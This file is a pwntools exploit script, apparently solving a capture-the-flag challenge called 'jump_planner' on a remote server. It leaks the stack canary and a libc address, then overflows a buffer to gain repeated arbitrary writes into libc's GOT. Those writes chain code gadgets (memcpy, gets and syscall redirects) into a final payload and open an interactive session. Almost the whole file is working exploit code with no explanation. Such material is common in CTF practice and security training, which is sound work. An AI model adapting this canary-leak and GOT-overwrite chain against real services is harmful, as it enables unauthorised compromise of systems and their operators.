from pwn import *
context.binary = elf = ELF("./jump_planner")
libc = ELF("./libc.so.6")

# io = elf.process()
# io = process("./run")
io = remote("jump.chrononaut.xyz", 5000)

# Leak Canary
io.sendlineafter(b">> ",b"3")
io.sendlineafter(b": ",b"5")
io.readuntil(b"to Year ")
canary = int(io.readuntil(b" ",drop=True))
print("canary:",hex(canary))

# Leak Libc
io.sendlineafter(b">> ",b"3")
io.sendlineafter(b": ",b"7")
io.readuntil(b"to Year ")
libc_leak = int(io.readuntil(b" ",drop=True))
print("libc leak:",hex(libc_leak))
libc.address = libc_leak -0x29d90
print("libc base:",hex(libc.address))


def do_write(value,target):
    # sets up one write, calls next time called
    io.sendlineafter(b">> ",b"4")
    io.sendlineafter(b": ",str(value).encode())
    io.sendlineafter(b": ",b"0")
    p  = b"A"*0x28
    p += p64(canary)
    p += p64(target)[:-1] #overwrite rbp sp that rbp-0x34 is target of write

    io.sendlineafter(b": ",p)

#GOT
strlen_got =  libc.address+0x219098 +0x34 # needed to start cahin
memcpy_got =  libc.address+0x219160 +0x34 # lea rdi,rsp 
stpcpy_got =  libc.address+0x219078 +0x34 # lea rdi,rsp as well
wcscmp_got =  libc.address+0x219130 +0x34 # add rsp, 0x...
strcasecmp_got=libc.address+0x219110+0x34 # mov rax, qword[rsp+0x40]
memmove_got = libc.address+0x219068 +0x34 # double call part one
strrchr_got = libc.address+0x219148 +0x34 # double call part two

#gadgets
syscall = libc.address+0x11ea3b #

lea_rdi_rsp = libc.address+0xec84e 
'''
000ec84e  488d7c240f         lea     rdi, [rsp+0xf]
000ec853  4c89c2             mov     rdx, r8
000ec856  4c89e6             mov     rsi, r12
000ec859  4883e7f0           and     rdi, 0xfffffffffffffff0
000ec85d  e8bebdf3ff         call    jump_memcpy
'''

double_call_gets = libc.address+0x1187f2 
'''
001187f2  e839fcf0ff         call    jump_memmove
001187f7  be2f000000         mov     esi, 0x2f
001187fc  4c89ef             mov     rdi, r13
001187ff  e8ecfdf0ff         call    jump_strrchr
'''

mov_rax_rsp_40 = libc.address+0x1597c8 
'''
001597c8  488b442440         mov     rax, qword [rsp+0x40 {var_68}]
001597cd  4c89e7             mov     rdi, r12
001597d0  4889c6             mov     rsi, rax
001597d3  4889442410         mov     qword [rsp+0x10 {var_98_1}], rax
001597d8  e8a3edecff         call    jump_strcasecmp
'''

add_rsp_a_lot = libc.address+0xd059b 
'''
000d059b  4881c4f8000000     add     rsp, 0xf8
000d05a2  5b                 pop     rbx {__saved_rbx}
000d05a3  5d                 pop     rbp {__saved_rbp}
000d05a4  415c               pop     r12 {__saved_r12}
000d05a6  415d               pop     r13 {__saved_r13}
000d05a8  415e               pop     r14 {__saved_r14}
000d05aa  415f               pop     r15 {__saved_r15}
000d05ac  e90f80f5ff         jmp     jump_wcscmp
'''

lea_rdi_rsp2 = libc.address+0x15554c #stpcpy 
'''
0015554c  488d7c2405         lea     rdi, [rsp+0x5]
00155551  4c89ee             mov     rsi, r13
00155554  c64424045f         mov     byte [rsp+0x4], 0x5f
00155559  e8f22eedff         call    jump___stpcpy
'''

# junk got addr to end the chain
end = libc.address+0x2190c8 +0x34

# setup double call for gets
gets = libc.symbols['gets']

writes = [end,
    lea_rdi_rsp, strlen_got,    
    double_call_gets,memcpy_got,
    mov_rax_rsp_40, strrchr_got,
    add_rsp_a_lot,strcasecmp_got,
    lea_rdi_rsp2, wcscmp_got, 
    syscall,stpcpy_got,

    gets,memmove_got,
    0]
writes=writes[::-1]

i=0
while i < len(writes)-1:
    do_write(writes[i],writes[i+1])
    i+=2

p2 = b"C"*0x28
p2 += p64(0x5add011)
p2 += b"D"*(0xe0-(8*4))
p2 += p64(0x6942069420)
p2 += p64(2)
p2 += p64(3)
p2 += b"A"*5
p2 += b"please_give_me_flag\x00"

io.sendline(p2)
io.interactive()